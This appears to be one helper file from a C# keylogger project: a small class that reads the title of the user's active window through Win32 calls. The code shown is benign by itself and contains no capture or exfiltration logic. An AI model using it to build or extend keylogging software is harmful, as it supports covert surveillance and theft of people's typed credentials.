using System.Text;

namespace KeyLogger.Helpers
{
    /// <summary>
    /// Gets properties of current active Window
    /// </summary>
    internal class Window
    {
        /// <summary>
        /// Gets title of the window that the user is working with
        /// </summary>
        internal string ActiveWindowTitle()
        {
            var hwnd = Win32.GetForegroundWindow();
            var title = new StringBuilder(1024);

            int textLength = Win32.GetWindowText(hwnd, title, title.Capacity);
            if ((textLength <= 0) || (textLength > title.Length))
                return "[Unknown]";

            return "[" + title + "]";
        }
    }
}
